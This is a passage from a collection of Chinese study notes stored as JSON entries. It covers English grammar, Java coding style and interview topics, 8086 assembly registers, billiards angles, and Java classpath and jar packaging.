newspaper等句式中.as引导非限定性定语从句中做主语,表语或宾语,且引出的从句位置比较灵活,可位于句首或句尾,也可插如入主句中间.通常由逗号将其与主句隔开.as此时有\"正如...\",\"就像...\"之意.\n在从句中做主语:\n```\n  As is known to China,Qu Yuan is a great Chinese poet. \n```\n在从句中做主语:\n```\n  He forgot to bring his textbook with him,as was often the case.\n```\n在从句中做表语:\n```\n  She is absorbed in work,as she often was.\n```\n在从句中做宾语:\n```\n  As we all know,the moon is round.\n```\n\n### 副词性从句（状语从句）\n状语从句是用来修饰整个主句或主句中的谓语动词，根据句子功能一般可分为9类状语从句：时间、地点、原因、目的、结果、条件、让步、比较、方式。如下例子：\n\n复合句中主句和从句的关系不是由连词决定的，而是由句子之间的关系决定, 如下例子：\n```\nMum was cooking dinner when Tom arrived home. 这里when Tom arrived home充当时间状语，用来修饰整个主句\n\nI cannot remember the year when I came back home. 这里的when I came back home充当定语从句，修饰the year \n```\n\n"
  },
  {
    "title": "./notes/基础知识/代码规范.md",
    "body": "# 空格\n1. `if / else / for / while  / switch / do / try / catch / finally`关键字后。\n2. `{`前与`}`后需要加空格, 如果大括号内容为空，则简洁地写成{}即可，大括号中间无须换行和加空格。\n3. 方法名与其后的左小括号(之间不加空格; 左右小括号与括号内部的相邻字符之间不要出现空格; 强转类型时右小括号后加空格\n4. 逗号后加空格\n5. 二目、三目运算符的左右两边加一个空格。\n6. 注释的双斜线与注释内容之间有且仅有一个空格。\n\n```java\n//错误例子示范，注：里面的代码之间没啥联系，都是随意给出的。\nint a=1\nint b=a==1?1:2;\nInteger s = (Integer)bbb; \nif(a==1&&b==2){\n    print(a,b);//调用打印函数\n}else{\n    \n}\npublic static void print(int a,int b){\n    System.out.printf(a+b);\n}\n```\n像上面的这个例子中，就是几乎没用到空格的，代码看起来很紧，反正我看起来是很不舒服，特别的当代码很多的时候。\n修改后如下：\n```java\nint a = 1;\nint b = a == 1 ? 1 : 2;\nInteger s = (Integer) bbb; \nif(a == 1 && b == 2) {\n    print(a, b);\n} else {}\n\npublic static void print(int a, int b) {\n    System.out.printf(a + b);// 调用打印函数\n}\n```\n"
  },
  {
    "title": "./notes/基础知识/汇编语言.md",
    "body": "# 寄存器\n寄存器是中央处理器内的组成部份。寄存器是有限存贮容量的高速存贮部件，它们可用来暂存指令、数据和位址。在中央处理器的控制部件中，包含的寄存器有指令寄存器(IR)和程序计数器(PC)。在中央处理器的算术及逻辑部件中，包含的寄存器有累加器(ACC)。\n\n寄存器是内存阶层中的最顶端，也是系统获得操作资料的最快速途径。寄存器通常都是以他们可以保存的位元数量来估量，举例来说，一个 “8 位元寄存器”或 “32 位元寄存器”。寄存器现在都以寄存器档案的方式来实作，但是他们也可能使用单独的正反器、高速的核心内存、薄膜内存以及在数种机器上的其他方式来实作出来。\n\n寄存器通常都用来意指由一个指令之输出或输入可以直接索引到的暂存器群组。更适当的是称他们为 “架构寄存器”。\n\n寄存器是CPU内部的元件，寄存器拥有非常高的读写速度，所以在寄存器之间的数据传送非常快。\n\n## 寄存器用途\n- 可将寄存器内的数据执行算术及逻辑运算；\n- 存于寄存器内的地址可用来指向内存的某个位置，即寻址；\n- 可以用来读写数据到电脑的周边设备。\n\n## 数据寄存器\n8086 有14个16位寄存器，这14个寄存器按其用途可分为:\n- 通用寄存器\n- 指令指针\n- 标志寄存器\n- 段寄存器\n\n### 通用寄存器\n通用寄存器有8个, 又可以分成2组:\n- 一组是数据寄存器(4个)\n- 另一组是指针寄存器及变址寄存器(4个)\n\n#### 数据寄存器\n数据寄存器分为:\n- AH&AL＝AX(accumulator)：累加寄存器，常用于运算;在乘除等指令中指定用来存放操作数,另外,所有的I/O指令都使用这一寄存器与外界设备传送数据.\n- BH&BL＝BX(base)：基址寄存器，常用于地址索引；\n- CH&CL＝CX(count)：计数寄存器，常用于计数；常用于保存计算值,如在移位指令,循环(loop)和串处理指令中用作隐含的计数器.\n- DH&DL＝DX(data)：数据寄存器，常用于数据传递。\n\n他们的特点是,这4个16位的寄存器可以分为高8位: AH, BH, CH, DH.以及低八位：AL,BL,CL,DL。这2组8位寄存器可以分别寻址，并单独使用。\n\n#### 指针寄存器和变址寄存器\n指针寄存器和变址寄存器分为:\n- SP（Stack Pointer）：堆栈指针，与SS配合使用，可指向目前的堆栈位置；\n- BP（Base Pointer）：基址指针寄存器，可用作SS的一个相对基址位置；\n- SI（Source Index）：源变址寄存器可用来存放相对于DS段之源变址指针；\n- DI（Destination Index）：目的变址寄存器，可用来存放相对于 ES 段之目的变址指针。\n\n这4个16位寄存器只能按16位进行存取操作，主要用来形成操作数的地址，用于堆栈操作和变址运算中计算操作数的有效地址。\n\n### 指令指针IP(Instruction Pointer)\n指令指针IP是一个16位专用寄存器，它指向当前需要取出的指令字节，当BIU从内存中取出一个指令字节后，IP就自动加1，指向下一个指令字节。注意，IP指向的是指令地址的段内地址偏移量，又称偏移地址(Offset Address)或有效地址(EA，Effective Address)。\n\n\n# c语言与汇编语言\n## 例1\n```cpp\nmain() {\n  int a = 5;\n  int b = 2;\n  int c = 7;\n  int sum = a + b + c;\n  printf(\"%d\", sum);\n}\n```\n\n对应汇编语言：\n```asm\nassume cs:code, ds:data\n\ndata segment\n  a dw 5\n  b dw 2\n  c dw 7\ndata ends\n\ncode segment\n  start:\n  mov bx, data\n  mov ds, bx\n\n  mov ax, a\n  add ax, b \n  add ax, c\n  \n\n  mov ax, 4c00h\n  int 21h\n  \ncode ends\n\nend start\n```\n  \n\n"
  },
  {
    "title": "./notes/基础知识/台球.md",
    "body": "# 分离角\n分离角：母球与子球碰撞分离后产生的角度\n击球角：击球前，母球瞄准方向与子球前进方向之间的角度\n![](https://gitee.com/NaisWang/images/raw/master/img/20211211150812.png)\n\n## 无旋转90度法则\n根据两球相撞的物理原理, 在不考虑摩擦与旋转的情况下，不论任何角度，击球后分离角始终为90度.\n\n![](https://gitee.com/NaisWang/images/raw/master/img/20211211141611.png)\n![](https://gitee.com/NaisWang/images/raw/master/img/20211211141712.png)\n\n但在实际的打球过程中，台泥与球之间一定会存在摩擦力，所以这种情况下，如果想要白球沿着90度分离角滑行，则需要使白球撞击目标球的瞬间，是无旋转状态的。而实现击球瞬间母球无旋转状态有2中实现方式：\n- 大力中杠击球，让母球滑行而非滚动至目标球\n- 中低杆击球，先让白球产生一些回旋，让白球在撞击目标球的瞬间是没有旋转状态的\n\n如果母球击打目标球的瞬间是旋转状态的话，对分离角的影响：\n- 前旋：分离角小于90度\n- 后旋：分离角大于90度\n\n[视频1 必看](https://www.youtube.com/watch?v=XC63lp-eOg4&list=PLpPW-mdPW_o31bF2FVPK_iMRvSNCwHJmh&index=138)\n[视频2](https://www.youtube.com/watch?v=hDEWxpaTRKw&list=PLpPW-mdPW_o31bF2FVPK_iMRvSNCwHJmh&index=139)\n[视频3](https://www.youtube.com/watch?v=gEs_fZDLEu0&list=PLpPW-mdPW_o31bF2FVPK_iMRvSNCwHJmh&index=140)\n[视频4](https://www.youtube.com/watch?v=gEs_fZDLEu0&list=PLpPW-mdPW_o31bF2FVPK_iMRvSNCwHJmh&index=141)\n\n## 高杆45度法则\n击球角等于15度，高杆击打后，击球后分离角为45度。\n击球角小于15度，高杆击打后，击球后分离角小于45度。\n击球角大于15度，高杆击打后，击球后分离角大于45度。\n\n[视频1](https://www.youtube.com/watch?v=xq1JDnordg4&list=PLpPW-mdPW_o31bF2FVPK_iMRvSNCwHJmh&index=142)\n"
  },
  {
    "title": "./notes/基础知识/面试.md",
    "body": "# java基础\n## String变量的两种创建方式\n在java中，有两种创建String类型变量的方式：\n```java\nString str01=\"abc\";//第一种方式\nString str02=new String(\"abc\")；//第二种方式\n```\n- 第一种方式创建String变量时，首先查找JVM方法区的字符串常量池是否存在存放\"abc\"的地址，如果存在，则将该变量指向这个地址，不存在，则在方法区创建一个存放字面值\"abc\"的地址。\n- 第二种方式创建String变量时，在堆中创建一个存放\"abc\"的对象，使变量str02指向堆中的对象。\n\n\n根据上面的创建方式，观察下面的示例：\n```java\nString str01 = \"abc\";\nString str02 = \"abc\";\nString str03 = new String(\"abc\");\nString str04 = new String(\"abc\");\nSystem.out.println(\"str01==str02:\" + (str01 == str02));\nSystem.out.println(\"str03==str04:\" + (str03 == str04));\nSystem.out.println(\"str01==str03:\" + (str01 == str03));\n```\n\n分析：\n1. 在创建str01时，方法区的字符串常量池中没有存储\"abc\"的地址，就在常量池中创建一个存放\"abc\"的地址，使变量str01指向该地址。创建str02时，字符串常量池已存在存放\"abc\"的地址，将str02变量指向该地址，此时str01与str02指向同一内存地址，所以\"str01==str02\"为true。\n2. 使用new关键字创建对象时，每一次都会在堆中创建一个新的对象，所以str03与str04指向对象的地址不同，\"str03==str04\"为false。\n3. str01指向方法区，str03指向堆，所以\"str01==str03\"为false。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220929150846.png)\n\nString对象被设计成不可改变的对象，即String对象所包含的字面值发生改变时，会开辟一个新的地址，创建一个新的对象，原地址不变。\n```java\nString str01 = \"abc\";\nString str02 = \"abc\";\nstr01=\"def\";\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220929151003.png)\n\n在方法区的字符串常量池中建立一个新的存储\"def\"的地址，str01指向该地址，str02的指向不变。\n\n\n## ==和equals\n\n视频：https://www.bilibili.com/video/BV1bA411P7yr?p=1&vd_source=0dbec39578cccad08efd6fd6d0a696e2\n\n- == : 它的作用是判断两个对象的地址是不是相等。即，判断两个对象是不是同一个对象。(基本数 据类型 == 比较的是值，引用数据类型 == 比较的是内存地址)\n- equals() : 它的作用也是判断两个对象是否相等。但它一般有两种使用情况: \n  - 情况1:类没有覆盖 equals() 方法。则通过 equals() 比较该类的两个对象时，等价于通过\n“==”比较这两个对象。\n  - 情况2:类覆盖了 equals() 方法。一般，我们都覆盖 equals() 方法来两个对象的内容相等;\n若它们的内容相等，则返回 true (即，认为这两个对象相等)。\n\n举个例子:\n```java\npublic class test1 {\n  public static void main(String[] args) {\n    String a = new String(\"ab\"); // a 为一个引用 \n    String b = new String(\"ab\"); // b为另一个引用,对象的内容一样 \n    String aa = \"ab\"; // 放在常量池中\n    String bb = \"ab\"; // 从常量池中查找\n    if (aa == bb) // true\n      System.out.println(\"aa==bb\"); \n    if (a == b) // false，非同一对象\n      System.out.println(\"a==b\");\n    if (a.equals(b)) // true\n      System.out.println(\"aEQb\");\n    if (42 == 42.0) { // true\n      System.out.println(\"true\");\n    } \n  }\n}\n```\n说明:\n- String中的equals方法是被重写过的，因为object的equals方法是比较的对象的内存地址， 而String的equals方法比较的是对象的值。 \n- 有关String的创建过程，可以参考**String变量的两种创建方式**章节\n\n## ArrayList和LinkedList区别\n### ArrayList\n基于动态数组，连续内存存储，适合下标访问（随机访问）。\n\n#### 扩容机制\n因为数组长度固定，所以超出长度存储数据时需要新建数组，然后将老数组的数据拷贝到新数组中。如果不是尾部插入数据还会涉及到元素的移动。\n\n#### ArrayList的数据插入一定比LinkedList低效吗\n答案是不一定，我们通常认为ArrayList的数据插入一定比LinkedList低效的原因是因为ArrayList插入数据时，可能会涉及到元素的移动所产生的消耗。如果我们使用尾插法并指定初始容量，则插入数据不会涉及到元素的移动，可以极大提高性能，甚至会超过LinkedList\n\n### LinkedList\n基于链表，可以存储在分散的内存中，适合做数据插入以及删除操作，不适合查询操作\n\n#### 为什么LinkedList不建议使用for循环遍历，而使用iterator方式进行遍历\n\n如果使用for循环方式遍历链表，由于链表中元素是通过指针连接彼此的，不存在索引的概念，如果使用for循环方式遍历LinkedList，依次传入索引值，则就相当于每次都要将链表撸一遍。\n\n如：在下面的这个遍历操作中，我们采用for的方式\n```java\npublic static void main(String[] args)\n{\n    List<Integer> linkedList = new LinkedList<Integer>();\n    \n    for (int i = 0; i < 100; i++)\n    {\n        linkedList.add(i);\n    }\n    for (int i = 0; i < 100; i++)\n    {\n        System.out.println(linkedList.get(i));\n    }\n} \n```\n实际上底层所执行的操作是，拿到这个值：\n```java\n     public E get(int index) {\n        checkElementIndex(index);\n        return node(index).item;\n     }\n     /**\n     * Returns the (non-null) Node at the specified element index.\n     */\n    Node<E> node(int index) {\n        // assert isElementIndex(index);\n         \n        if (index < (size >> 1)) {\n            Node<E> x = first;\n            //遍历链表，找到下标所对应的节点\n            for (int i = 0; i < index; i++)\n                x = x.next;\n            return x;\n        } else {\n            Node<E> x = last;\n            for (int i = size - 1; i > index; i--)\n                x = x.prev;\n            return x;\n        }\n    }\n```\n可以发现，如果使用for循环方式遍历LinkedList，问题的焦点是每次get()方法接收一个值，都会对链表遍历找到这个数值在链表中所对应的节点，肯定效率不高，而如果是ArrayList，由于它底层使用的对象数组实现，对象数组能够支持随机访问，所以效率比较高。\n\n那为什么使用iterator方式来遍历LinkedList效率比较高呢？这是因为iterator的next()，是顺着链表节点顺序读取数据，所以效率就很高了。\n\n究其根本原因是数组支持随机访问，但是链表不支持随机访问。\n\n> 扩展：for-Each方式的底层使用的是iterator方式遍历\n\n#### 为什么不推荐indexOf返回元素索引\n不要试图用indexOf返回元素索引,同样查看代码也可以看出LinkedList的indexOf函数也需要对链表进行遍历操作。\n\n```java\n   public int indexOf(Object o) {\n        int index = 0;\n        if (o == null) {\n            for (Node<E> x = first; x != null; x = x.next) {\n                if (x.item == null)\n                    return index;\n                index++;\n            }\n        } else {\n            for (Node<E> x = first; x != null; x = x.next) {\n                if (o.equals(x.item))\n                    return index;\n                index++;\n            }\n        }\n        return -1;\n    }\n```\n"
  },
  {
    "title": "./notes/基础知识/java.md",
    "body": "# 常见包下的类\n| 包                | 类                                                                                                 |\n| ----------------- | -------------------------------------------------------------------------------------------------- |\n| java.lang         | Math, String, StringBuffer, Integer, Comparable, Iterable, Thread,Runnable, Runtime, Exception     |\n| java.lang.reflect | Field, InvocationHandler, Proxy, Method                                                            |\n| java.lang.annotation |  ElementType, Retention, RetentionPolicy, Target等                                            |\n| java.util         | Arrays, 所有集合类(如ArrayList)，所有Map类(如HashMap)，Collections，Comparator, Iterator，Optional |\n| java.io           | File, InputStream, IOException                                                                     |\n\n程序运行时会自动引入`Java.lang.*`\n\n# Scanner中nextInt与nextLine\nURL：https://stackoverflow.com/questions/13102045/scanner-is-skipping-nextline-after-using-next-or-nextfoo\n\n问题： Scanner is skipping nextLine() after using next() or nextFoo()?\n\n回答:\n\nThat's because the Scanner.nextInt method does not read the newline character in your input created by hitting \"Enter,\" and so the call to Scanner.nextLine returns after reading that newline.\n\nYou will encounter the similar behaviour when you use Scanner.nextLine after Scanner.next() or any Scanner.nextFoo method (except nextLine itself).\n\n\nEither put a `Scanner.nextLine` call after each `Scanner.nextInt` or `Scanner.nextFoo` to consume rest of that line including newline\n```java\nint option = input.nextInt();\ninput.nextLine();  // Consume newline left-over\nString str1 = input.nextLine();\n```\nOr, even better, read the input through `Scanner.nextLine` and convert your input to the proper format you need. For example, you may convert to an integer using Integer.parseInt(String) method.\n\n```java\nint option = 0;\ntry {\n    option = Integer.parseInt(input.nextLine());\n} catch (NumberFormatException e) {\n    e.printStackTrace();\n}\nString str1 = input.nextLine();\n```\n\n# classpath和jar\n## classpath\n\n在Java中，我们经常听到classpath这个东西。网上有很多关于“如何设置classpath”的文章，但大部分设置都不靠谱。\n\n到底什么是classpath？\n\nclasspath是JVM用到的一个环境变量，它用来指示JVM如何搜索class。\n\n因为Java是编译型语言，源码文件是.java，而编译后的.class文件才是真正可以被JVM执行的字节码。因此，JVM需要知道，如果要加载一个abc.xyz.Hello的类，应该去哪搜索对应的Hello.class文件。\n\n所以，classpath就是一组目录的集合，它设置的搜索路径与操作系统相关。例如，在Windows系统上，用;分隔，带空格的目录用\"\"括起来，可能长这样：\n```\nC:\\work\\project1\\bin;C:\\shared;\"D:\\My Documents\\project1\\bin\"\n```\n\n在Linux系统上，用:分隔，可能长这样：\n```\n/usr/shared:/usr/local/bin:/home/liaoxuefeng/bin\n```\n\n现在我们假设classpath是`.;C:\\work\\project1\\bin;C:\\shared`，当JVM在加载`abc.xyz.Hello`这个类时，会依次查找：\n- <当前目录>\\abc\\xyz\\Hello.class\n- C:\\work\\project1\\bin\\abc\\xyz\\Hello.class\n- C:\\shared\\abc\\xyz\\Hello.class\n\n注意到.代表当前目录。如果JVM在某个路径下找到了对应的class文件，就不再往后继续搜索。如果所有路径下都没有找到，就报错。\n\nclasspath的设定方法有两种：\n- 在系统环境变量中设置classpath环境变量，不推荐；\n- 在启动JVM时设置classpath变量，推荐。\n\n我们强烈不推荐在系统环境变量中设置classpath，那样会污染整个系统环境。在启动JVM时设置classpath才是推荐的做法。实际上就是给java命令传入-classpath或-cp参数：\n```\njava -classpath .;C:\\work\\project1\\bin;C:\\shared abc.xyz.Hello\n```\n或者使用-cp的简写：\n```\njava -cp .;C:\\work\\project1\\bin;C:\\shared abc.xyz.Hello\n```\n没有设置系统环境变量，也没有传入-cp参数，那么JVM默认的classpath为.，即当前目录：\n```\njava abc.xyz.Hello\n```\n上述命令告诉JVM只在当前目录搜索Hello.class。\n\n在IDE中运行Java程序，IDE自动传入的-cp参数是当前工程的bin目录和引入的jar包。\n\n通常，我们在自己编写的class中，会引用Java核心库的class，例如，String、ArrayList等。这些class应该上哪去找？\n\n有很多“如何设置classpath”的文章会告诉你把JVM自带的rt.jar放入classpath，但事实上，根本不需要告诉JVM如何去Java核心库查找class，JVM怎么可能笨到连自己的核心库在哪都不知道？\n\n>不要把任何Java核心库添加到classpath中！JVM根本不依赖classpath加载核心库！\n\n更好的做法是，不要设置classpath！默认的当前目录.对于绝大多数情况都够用了。\n\n假设我们有一个编译后的Hello.class，它的包名是com.example，当前目录是C:\\work，那么，目录结构必须如下：\n\nC:\\work\n└─ com\n   └─ example\n      └─ Hello.class\n运行这个Hello.class必须在当前目录下使用如下命令：\n```\nC:\\work> java -cp . com.example.Hello\n```\n\nJVM根据classpath设置的.在当前目录下查找com.example.Hello，即实际搜索文件必须位于com/example/Hello.class。如果指定的.class文件不存在，或者目录结构和包名对不上，均会报错\n\n## jar包\n如果有很多.class文件，散落在各层目录中，肯定不便于管理。如果能把目录打一个包，变成一个文件，就方便多了。\n\njar包就是用来干这个事的，它可以把package组织的目录层级，以及各个目录下的所有文件（包括.class文件和其他文件）都打成一个jar文件，这样一来，无论是备份，还是发给客户，就简单多了。\n\njar包实际上就是一个zip格式的压缩文件，而jar包相当于目录。如果我们要执行一个jar包的class，就可以把jar包放到classpath中：\n```\njava -cp ./hello.jar abc.xyz.Hello\n```\n这样JVM会自动在hello.jar文件里去搜索某个类。\n\n那么问题来了：如何创建jar包？\n\n因为jar包就是zip包，所以，直接在资源管理器中，找到正确的目录，点击右键，在弹出的快捷菜单中选择“发送到”，“压缩(zipped)文件夹”，就制作了一个zip文件。然后，把后缀从.zip改为.jar，一个jar包就创建成功。\n\n假设编译输出的目录结构是这样：\n\npackage_sample\n└─ bin\n   ├─ hong\n   │  └─ Person.class\n   │  ming\n   │  └─ Person.class\n   └─ mr\n      └─ jun\n         └─ Arrays.class\n这里需要特别注意的是，jar包里的第一层目录，不能是bin，而应该是hong、ming、mr。如果在Windows的资源管理器中看，应该长这样：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329130249.png)\n\n如果长这样：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329130315.png)\n\n说明打包打得有问题，JVM仍然无法从jar包中查找正确的class，原因是hong.Person必须按hong/Person.class存放，而不是bin/hong/Person.class。\n\njar包还可以包含一个特殊的/META-INF/MANIFEST.MF文件，MANIFEST.MF是纯文本，可以指定Main-Class和其它信息。JVM会自动读取这个MANIFEST.MF文件，如果存在Main-Class，我们就不必在命令行指定启动的类名，而是用更方便的命令：\n```\njava -jar hello.jar\n```\njar包还可以包含其它jar包，这个时候，就需要在MANIFEST.MF文件里配置classpath了。\n\n在大型项目中，不可能手动编写MANIFEST.MF文件，再手动创建zip包。Java社区提供了大量的开源构建工具，例如Maven，可以非常方便地创建jar包。\n\n### META-INF/MANIFEST.MF文件\n打开Java的JAR文件我们经常可以看到文件中包含着一个META-INF目录， 这个目录下会有一些文件，其中必有一个MANIFEST.MF，这个文件描述了该Jar文件的很多信息，下面将详细介绍MANIFEST.MF文件的内 容，先来看struts.jar中包含的MANIFEST.MF文件内容：\n```\nManifest-Version: 1.0\nCreated-By: Apache Ant 1.5.1\nExtension-Name: Struts Framework\nSpecification-Title: Struts Framework\nSpecification-Vendor: Apache Software Foundation\nSpecification-Version: 1.1\nImplementation-Title: Struts Framework\nImplementation-Vendor: Apache Software Foundation\nImplementation-Vendor-Id: org.apache\nImplementation-Version: 1.1\nClass-Path:  commons-beanutils.jar commons-collections.jar commons-dig\n ester.jar commons-logging.jar commons-validator.jar jakarta-oro.jar s\n truts-legacy.jar\n```\n如果我们把MANIFEST中的配置信息进行分类，可以归纳出下面几个大类：\n\n#### 一般属性\n1. Manifest-Version\n用来定义manifest文件的版本，例如：Manifest-Version: 1.0\n2. Created-By\n声明该文件的生成者，一般该属性是由jar命令行工具生成的，例如：Created-By: Apache Ant 1.5.1\n3. Signature-Version\n定义jar文件的签名版本\n4. Class-Path\n应用程序或者类装载器使用该值来构建内部的类搜索路径\n\n#### 应用程序相关属性\n1. Main-Class\n定义jar文件的入口类，该类必须是一个可执行的类，一旦定义了该属性即可通过 java -jar x.jar来运行该jar文件。\n\n#### 小程序(Applet)相关属性\n1. Extendsion-List\n该属性指定了小程序需要的扩展信息列表，列表中的每个名字对应以下的属性\n2. `<extension>-Extension-Name`\n3. `<extension>-Specification-Version`\n4. `<extension>-Implementation-Version`\n5. `<extension>-Implementation-Vendor-Id`\n6. `<extension>-Implementation-URL`\n\n#### 扩展标识属性\n1. Extension-Name\n该属性定义了jar文件的标识，例如Extension-Name: Struts Framework\n\n#### 包扩展属性\n1. Implementation-Title   定义了扩展实现的标题\n2. Implementation-Version   定义扩展实现的版本\n3. Implementation-Vendor   定义扩展实现的组织  \n4. Implementation-Vendor-Id   定义扩展实现的组织的标识\n5. Implementation-URL :   定义该扩展包的下载地址(URL)\n6. Specification-Title   定义扩展规范的标题\n7. Specification-Version   定义扩展规范的版本\n8. Specification-Vendor   声明了维护该规范的组织\n9. Sealed   定义jar文件是否封存，值可以是true或者false (这点我还不是很理解)\n\n#### 签名相关属性\n签名方面的属性我们可以来参照JavaMail所提供的mail.jar中的一段\nName: javax/mail/Address.class\nDigest-Algorithms: SHA MD5 \nSHA-Digest: AjR7RqnN//cdYGouxbd06mSVfI4=\nMD5-Digest: ZnTIQ2aQAtSNIOWXI1pQpw==\n\n这段内容定义类签名的类名、计算摘要的算法名以及对应的摘要内容(使用BASE方法进行编码)\n\n#### 自定义属性\n除了前面提到的一些属性外，你也可以在MANIFEST.MF中增加自己的属性以及响应的值，例如J2ME程序jar包中就可能包含着如下信息\n\nMicroEdition-Configuration: CLDC-1.0\nMIDlet-Name: J2ME_MOBBER Midlet Suite\nMIDlet-Info-URL: http://www.javayou.com\nMIDlet-Icon: /icon.png\nMIDlet-Vendor: Midlet Suite Vendor\nMIDlet-1: mobber,/icon.png,mobber\nMIDlet-Version: 1.0.0\nMicroEdition-Profile: MIDP-1.0\nMIDlet-Description: Communicator\n\n关键在于我们怎么来读取这些信息呢？其实很简单，JDK给我们提供了用于处理这些信息的API，详细的信息请见java.util.jar包中，我们可以通 过给JarFile传递一个jar文件的路径，然后调用JarFile的getManifest方法来获取Manifest信息。\n\n更详细关于JAR文件的规范请见\nhttp://java.sun.com/j2se/1.3/docs/guide/jar/jar.html\n中文说明\nhttp://www-900.ibm.com/developerWorks/cn/java/j-jar/\n\n### jar工具\n为了用 JAR 文件执行基本的任务，要使用作为java Development Kit 的一部分提供的 Java Archive Tool ( jar 工具)。用 jar 命令调用 jar 工具。\n\n|功能 |命令|\n|--|--|\n|用一个单独的文件创建一个 JAR 文件 | jar cf jar-file input-file...|\n|用一个目录创建一个 JAR 文件 | jar cf jar-file dir-name|\n|创建一个未压缩的 JAR 文件 |jar cf0 jar-file dir-name|\n|更新一个 JAR 文件 | jar uf jar-file input-file...|\n|查看一个 JAR 文件的内容 | jar tf jar-file|\n|提取一个 JAR 文件的内容 | jar xf jar-file|\n|从一个 JAR 文件中提取特定的文件 | jar xf jar-file archived-file...|\n|运行一个打包为可执行 JAR 文件的应用程序 | java -jar app.jar|\n\n## 小结\nJVM通过环境变量classpath决定搜索class的路径和顺序；\n不推荐设置系统环境变量classpath，始终建议通过-cp命令传入；\njar包相当于目录，可以包含很多.class文件，方便下载和使用；\nMANIFEST.MF文件可以提供jar包的信息，如Main-Class，这样可以直接运行jar包。\n\n# 使用java编译多个文件\n例如当前的java项目结构如下：\n```shell\nwanghengzhi@:~/Temp/java/spring$ tree\n.\n└── whz\n    └── com\n        ├── java\n        │   ├── AppConfig.java\n        │   └── Test.java\n        └── spring\n            ├── Component.java\n            ├── ComponentScan.java\n            ├── Configuration.java\n            ├── NotConfigurationException.java\n            └── WhzApplicationContext.java\n\n4 directories, 7 files\n```\n其中Test.java代码如下：\n```java\npackage whz.com.java;\n\nimport whz.com.spring.WhzApplicationContext;\nimport whz.com.spring.NotConfigurationException;\nimport whz.com.java.AppConfig;\n\npublic class Test{\n  public static void main(String[] args) throws NotConfigurationException{\n    WhzApplicationContext whzApplicationContext = new WhzApplicationContext(AppConfig.class);\n    whzApplicationContext.getBean(null);\n  }\n}\n```\n我们可以使用如下命令来编译这个项目\n```shell\nwanghengzhi@:~/Temp/java/spring$ javac -d classes $(find . -name '*.java')\n```\n编译完成后的目录结构如下:\n```shell\nwanghengzhi@:~/Temp/java/spring$ tree\n.\n├── classes\n│   └── whz\n│       └── com\n│           ├── java\n│           │   ├── AppConfig.class\n│           │   └── Test.class\n│           └── spring\n│               ├── Component.class\n│               ├── ComponentScan.class\n│               ├── Configuration.class\n│               ├── NotConfigurationException.class\n│               └── WhzApplicationContext.class\n└── whz\n    └── com\n        ├── java\n        │   ├── AppConfig.java\n        │   └── Test.java\n        └── spring\n            ├── Component.java\n            ├── ComponentScan.java\n            ├── Configuration.java\n            ├── NotConfigurationException.java\n            └── WhzApplicationContext.java\n\n9 directories, 14 files\n```\n\n# java中的数据类型与类型转换\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329130336.png)\n\nJava基本类型基本： byte,short,char  `<`  int  `<`  long  `<`  float  `<` double\n表达式中的类型会自动提升到表达式中类型最高的一级\n基本类型比较大小时，比较符两边的类型会自动提升到较高的一级\n```java\nint a = 5;\ndouble b = 5.0;\nSystem.out.println(a == b) //true\n```\n\njava基本类型中基本高的不能自动转换为级别低的， 如果不进行强转，则会报错。\n使用`-=`, `+=`, `/=`, `%=`会自动完成完成强转转换，而`=`不行\n\njava中的整形常量默认为int型，声明long型常量可以在后面加`l`或`L`\njava中的浮点型常量默认为double型，声明float型常量可以在后面加`f`或`F`\n\n## float f = 3.5是否正确\n不正确\n\n## short s1=1; s1=s1+1有错吗？ short s1=1; s1+=1有错吗\n第一个有错，第二个没错\n\n## Switch是否能作用在byte、long、string上\n在java5以前，switch(expr)中，expr只能是byte、short、int、char。从java5开始，java中引入了枚举型，expr也可以是enum类型，从java7开始，expr还可以是String。\n其实，expr准确的说，数值型的只可以是int类型，但是 byte, short, char 都可以自动转换成 int 类型，所以expr也可以是byte, short, char。当然了，对应的包装类也是可以自动转换，所以x也可以是包装类型的。\n无论哪个版本的JDK，都是不支持 long，float，double，boolean 这个一定要注意！\n因为在Float/Double上执行精确的相等匹配通常是个坏主意。\n\n# 声明成员数组时包含变量\n加载(非静态变量，非静态初始化块)、构造器的过程是在实例初始化过程, 且执行顺序与所写顺序一致\n\n例1:\n```java\nclass Test {\n\tint n;\n\tint[][] plants = new int[n][2];\n}\n```\n此时由于执行到`int[][] plants = new int[n][2]`语句时，已经执行了`int n`语句。而`n`的默认值为0，所以声明plants的语句实际上是`int[][] plants = new int[0][2]`, 因为在转换成汇编语言后是不会存储变量名称的（对于基本类型，汇编语言会保存其值。对于引用类型，汇编语言会保存其指向的地址）。\n\n\n例2:\n```java\nclass Test {\n\tInteger n;\n\tint[][] plants = new int[n][2];\n}\n```\n由于n的初始值为null，所以在执行声明plants语句时，会报如下错误：\n```\nException in thread \"main\" java.lang.NullPointerException\n\tat Test.<init>\n```\n\n例2:\n```java\nclass Test {\n\tint[][] plants = new int[n][2];\n\tint n;\n}\n```\n此时由于声明plants语句比声明n语句先执行，所以在转成汇编语言时，会找不到变量n对应的值，所以在编译的时候会报错\n\n\n# 包装类\nJava中每一种基本类型都会对应一个唯一的包装类，基本类型与其包装类都可以通过包装类中的静态或者成员方法进行转换。每种基本类型及其包装类的对应关系如下，值得注意的是，所有的包装类都是final修饰的，也就是它们都是无法被继承和重写的。\n\n| 基本数据类型 | 包装类    |\n| ------------ | --------- |\n| byte         | Byte      |\n| short        | Short     |\n| int          | Integer   |\n| long         | Long      |\n| float        | Float     |\n| double       | Double    |\n| char         | Character |\n| boolean      | Boolean   |\n\n\n## 包装类与基本类型的转换（装箱与拆箱）\n- 自动装箱：自动调用基本类型对应的包装类中的valueOf()方法来返回包装类;\n- 自动拆箱：自动调用包装类中的xxxValue()方法来返回基本数据类型；\n注：包装类数组与基本类型数组之间不会自动转换，并且也不能强转。因为数组是引用类型，引用类型之间的转换必须要满足<a href=\"#convert\">转换的条件</a>\n```java\nint a = 1;\nInteger b = a; // 自动调用Integer.valueOf(a)来返回包装类给b\nint c = b; // 自动调用b.intValue()返回基本类型数据给c\n\nint[] d = (int[])new Integer[1]; //报错，不能Integer[]不能强转为int[]\nInteger e = (Integer[])new int[1];//报错，不能int[]不能强转为Integer[]\n```\n\n从源代码的角度来看，基础类型和包装类型都可以通过赋值语法赋值给对立的变量类型，如下面的代码所示。\n```java\nInteger a = 1;\nint a = new 